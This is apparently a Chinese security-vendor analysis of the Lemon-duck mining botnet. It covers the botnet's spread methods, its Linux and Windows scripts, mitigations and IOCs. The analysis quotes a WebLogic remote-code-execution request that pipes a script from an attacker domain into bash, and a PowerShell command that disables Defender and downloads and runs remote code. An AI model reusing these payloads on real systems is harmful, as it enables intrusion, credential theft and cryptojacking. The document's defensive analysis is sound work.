# 概述

近日，阿里云安全监测到利用多种方式传播的僵尸网络Lemon-duck持续活跃，该僵尸网络不仅利用永恒之蓝漏洞、RDP暴力破解、SSH暴力破解、MS-SQL暴力破解、Redis未授权访问、Hadoop未授权访问等进行扫描入侵，同时变种集成WebLogic未授权访问远程命令执行漏洞进行互联网传播，并通过SMB、NTLM进行横向移动，从而实现挖矿、后门远控等功能，对主机、用户资产危害极大。

阿里云安全持续对该僵尸网络进行监控，发现近期传播有所上升，提醒广大用户注意防护。

![image](https://image.3001.net/images/20210910/1631268446_613b2e5e08f7afb4264ca.jpg!small)

# 传播手段

Lemon-duck通过多个服务暴力破解、未授权访问远程命令执行及横向移动等进行传播，其路径如图所示。

![image](https://image.3001.net/images/20210910/1631268471_613b2e77a5e5787380911.jpg!small)

### 阶段分析

![image](https://image.3001.net/images/20210910/1631268499_613b2e9349f4af1f8ed3c.jpg!small)

# 详细分析

Lemon-duck新增WebLogic未授权访问远程命令执行模块，Lemon-duck入侵WebLogic应用之后会通过URL:
t.bb3u9.com/ln/core.png?logic 下载bash脚本并执行

    
    
    GET /console/images/%2E%2E%2Fconsole.portal?_nfpb=true&ampamp_pageLabel=HomePage1&ampamphandle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec(new String[]{'/bin/sh','-c','export src=logic;curl -fsSL t.bb3u9.com/ln/core.png?logic|bash'});"); HTTP/1.1
    
    Host: xxx.xxx.xxx.xxx
    User-Agent: curl/7.55.1
    Accept: */*
    Content-Type:application/x-www-form-urlencoded; charset=utf-8
    

通过SSH暴力破解、RDP暴力破解等入侵会执行如下命令

    
    
    cmd /c powershell Set-MpPreference -DisableRealtimeMonitoring 1;Add-MpPreference -ExclusionProcess c:windowssystem32WindowsPowerShellv1.0powershell.exe&powershell IEX(New-Object Net.WebClient).DownloadString("http://t.bb3u9.com/rdp.jsp
    

如下我们针对入侵Linux、Windows平台后的行为进行分析。

# Linux平台

Linux平台下Lemon-duck入侵后会下载名为core.png的bash脚本，作用是下载核心bash脚本和将失陷主机传送到远程C&C端，并通过crontab做持久化。

![image](https://image.3001.net/images/20210910/1631268593_613b2ef16669c1e853629.jpg!small)

### 核心Bash脚本分析

通过known_hosts中携带的主机信息进行传播，下载名为core.png的bash脚本，同时将本地主机信息上报远控端。

![image](https://image.3001.net/images/20210910/1631268621_613b2f0da01668c637374.jpg!small)

localgo函数中会通过conifg、history文件、进程、配置文件等获取用户、端口、rsa密钥等进而批量尝试传播。

![image](https://image.3001.net/images/20210910/1631268641_613b2f214b12157852407.jpg!small)

通过$userlist、$hostlist、$keylist、$sshports即用户名列表、主机列表、密钥列表、SSH端口列表的遍历对外进行传播。

![image](https://image.3001.net/images/20210910/1631268658_613b2f32c192ad362a9a2.jpg!small)

脚本中主要函数功能总结如下

![image](https://image.3001.net/images/20210910/1631268676_613b2f44c8138bf77feb4.jpg!small)

# Windows平台

### 核心powershell脚本分析

核心powershell脚本文件经过三层的混淆，经过三次反混淆后得到可读的Powershell文件，文件包含了收集失陷主机信息、下载脚本、二进制文件，进行C&C通信等功能。如图所示Lemon-duck收集失陷主机的系统、网卡、CPU等信息。

![image](https://image.3001.net/images/20210910/1631268707_613b2f631fc2af150aff9.jpg!small)

并通过params参数拼接上述各类系统信息，发送至C&C。

![image](https://image.3001.net/images/20210910/1631268730_613b2f7acb666dfc0f033.jpg!small)

需要下载的文件包含if.bin和kr.bin文件，其中两个为powershell脚本。

![image](https://image.3001.net/images/20210910/1631268751_613b2f8f7ee75bac3a24d.jpg!small)

### if.bin分析

对上述if.bin(md5:
0261b30c6773e4c04987bbe5090ba685)的powershell文件进行反混淆处理，可以看到如图所示文件包含了核心的传播模块，包含RDP、SSH、Redis、SMB、Yarn、WebLogic的命令模块。

![image](https://image.3001.net/images/20210910/1631268803_613b2fc3985bd1d818d36.jpg!small)

通过各个函数模块进行调用，例如调用logicexec进行WebLogic未授权访问远程命令执行

![image](https://image.3001.net/images/20210910/1631268822_613b2fd62233ad8850c35.jpg!small)

通过powerdump模块dump本地hash

![image](https://image.3001.net/images/20210910/1631268844_613b2fec092d1bccade88.jpg!small)

脚本中还集成了弱密码表

![image](https://image.3001.net/images/20210910/1631268861_613b2ffd1f0e4324ec7a1.jpg!small)

检测本地是否存在mimikatz和plink文件，如果没有通过下载路径进行下载

![image](https://image.3001.net/images/20210910/1631268880_613b3010ee7a5d89bf3ad.jpg!small)

脚本中主要函数功能总结如下

![image](https://image.3001.net/images/20210910/1631268897_613b3021ae3415d1077a4.jpg!small)

### kr.bin分析

对上述kr.bin(md5:
b7a1cfd74661361f71856388dac5aaa6)的powershell文件进行反混淆处理，该文件主要功能为建立一个守护进程角色持续进行监控。如图所示程序持续监控

![image](https://image.3001.net/images/20210910/1631268926_613b303e96085a1d0af5b.jpg!small)

其中getprotected通过路径匹配m6g.bin.exe和m6.bin.exe的挖矿文件来获取进程ID，用于保护自身挖矿进程

![image](https://image.3001.net/images/20210910/1631268944_613b3050047a9f503b8ab.jpg!small)

ProcessSuspend用于将进程暂停

![image](https://image.3001.net/images/20210910/1631268960_613b3060ee0768528f688.jpg!small)

Killer是核心功能函数，Lemon-duck会遍历进程，通过匹配名单结束名单中的进程，例如 Windows_update, Windows
Managers，Oracle Java
Update等进程，同时会杀死其他挖矿程序进程诸如MinerGate，minerd，Carbon，javaupd等，还会通过netstat遍历外联IP然后中断连接。

![image](https://image.3001.net/images/20210910/1631268979_613b307366f01a49682b6.jpg!small)

# 安全解决方案

1）避免将远程服务SSH、RDP暴露给全网，建议通过策略区域放行或对特定IP放行，针对未修复的漏洞及时软件升级或配置升级，同时开启四层、七层漏洞防护、虚拟补丁功能。

2）云防火墙针对暴力破解、扫描、挖矿行为、数据库等云上高危危害针对性防护，对于Lemon-duck利用多种方式，如四层网络协议中SSH暴力破解、RDP暴力破解、MS-SQL暴力破解、MS17-010漏洞，七层网络协议中Redis未授权访问远程命令执行、Hadoop
Yarn未授权访问远程命令执行、WelLogic未授权访问远程命令执行等，都可以轻松的通过一键开启IPS防护模块进行防御。如图云防火墙概览页中场景提供了以上场景的历史数据。

![image](https://image.3001.net/images/20210910/1631269015_613b3097c071853af6c05.jpg!small)

# IOC

Domain  
t.bb3u9.com  
t.pp6r1.com  
p.b69kq.com  
d.u78wjdu.com  
t.zer9g.com  
d.cu38l.com  
d.ttr3p.com  
URL  
hxxp://d.u78wjdu.com/ln/xr.zip  
hxxp://d.u78wjdu.com/m6.bin?redacted  
IP  
170.187.149.77  
138.68.186.90  
176.58.99.231  
138.68.251.24  
165.227.62.120  
202.182.120.192  
MD5  
a.asp: 576e06f3b4d78e6d0ab462da0eb70238 (bash shell)  
ifbin: 0261b30c6773e4c04987bbe5090ba685 (powershell)  
krbin: b7a1cfd74661361f71856388dac5aaa6 (powershell)

